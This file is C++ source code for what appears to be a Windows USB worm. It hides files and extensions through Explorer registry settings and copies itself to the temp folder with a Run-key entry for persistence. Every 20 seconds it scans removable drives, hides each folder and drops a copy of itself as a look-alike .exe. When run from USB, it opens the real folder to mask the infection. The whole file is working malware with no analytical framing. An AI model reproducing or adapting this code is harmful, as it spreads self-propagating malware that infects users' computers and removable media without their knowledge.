#include <windows.h>
#include<iostream>
#define TIME 20000
char *url;


void Hide()
{
    HKEY Key;
    DWORD value;
    if(RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", 0, KEY_ALL_ACCESS, &Key)== ERROR_SUCCESS)
    {
        value=2;
        RegSetValueEx(Key,"Hidden", 0, REG_DWORD, (const BYTE*)&value, sizeof(value));
        value=1;
        RegSetValueEx(Key,"HideFileExt", 0, REG_DWORD, (const BYTE*)&value, sizeof(value));
        RegCloseKey(Key);
    }    
}

void Add_Spread(char *value)
{
    HKEY Key;
    if(RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &Key)== ERROR_SUCCESS)
    {
        MessageBox(NULL,value,"CM LABS",MB_OK);
        RegSetValueEx(Key,"Spread", 0, REG_SZ, (const BYTE*)value,strlen(value));
        RegCloseKey(Key);
    }
    
}

void Copy_Spread()
{
    char Dir[MAX_PATH],file[]="oldies";
    LPSECURITY_ATTRIBUTES attr;
    attr = NULL;
    GetTempPath(255,Dir);
    strcat(Dir,file);
    CreateDirectory(Dir,attr);
    strcat(Dir,"\\spread.exe");
    CopyFile(url,Dir,true);
    Add_Spread(Dir);   
}


void Infeccion()
{
    Hide();
    Copy_Spread();
    //Copy_Trojan();
}

void infectar(char *nombre)
{
    char lol[MAX_PATH]="";
    strcat(lol,nombre);
    CopyFile(url,lol,true); //si el archivo existe no lo reemplaza
}

void limpiar(char *a)
{
    for(int c=0;c<30;c++)
    {
        a[c]=0;
    }
}

void listar_Directorios(char *dir)
{
    WIN32_FIND_DATA find,f;
    HANDLE hFind,ad;
    char b[MAX_PATH]="";
    
    strcat(dir,"\\");
    strcat(b,dir);
    strcat (dir,"*");
    hFind = FindFirstFile(dir, &find);
    limpiar(dir);
    do
    {
        strcat(dir,b);    
        strcat(dir,find.cFileName);   
        if(find.dwFileAttributes == 18)
        {
            strcat(dir,".exe");
            ad=FindFirstFile(dir, &f);
        }
        if(find.dwFileAttributes == 16)
        {
            SetFileAttributes(dir,18);
            strcat(dir,".exe");
            infectar(dir);
        }
        limpiar(dir);            
    }while(FindNextFile(hFind, &find) != 0);
    
    //CloseHandle(ad);
    CloseHandle(hFind);
}

void search_USB()
{
    char letter[]="A:\0";
    for(letter[0]='A'; letter[0]<='Z';letter[0]+=1)
    {
        if(GetDriveType(letter) == DRIVE_REMOVABLE) 
        {
            listar_Directorios(letter);
        }
    } 
}

int main (int argc, char**args)
{
    url=args[0];
    Infeccion();
    char r[MAX_PATH];
    char execute[MAX_PATH]="";
    int c=0,x=0;
    r[0]=args[0][0];                                   
    r[1]=args[0][1];
    r[2]='\0'; 
    if(GetDriveType(r) == DRIVE_REMOVABLE)      //verifica de donde se ejecuta la infeccion
    {
        while(args[0][c]!='\0')
        {
            if((args[0][c]=='\\') || x>0)
            {
                if(args[0][c]=='.'){break;}
                execute[x]=args[0][c];
                x++;
            }
            c++;    
        }
        execute[x]='\0';       
        strcat(r,execute);
        ShellExecute(NULL,"open","explorer.exe",r,"",3);
    }
    else
    {
        while(true)
        {
            search_USB();
            Sleep(TIME);
        }
    }
    return 0;
} 
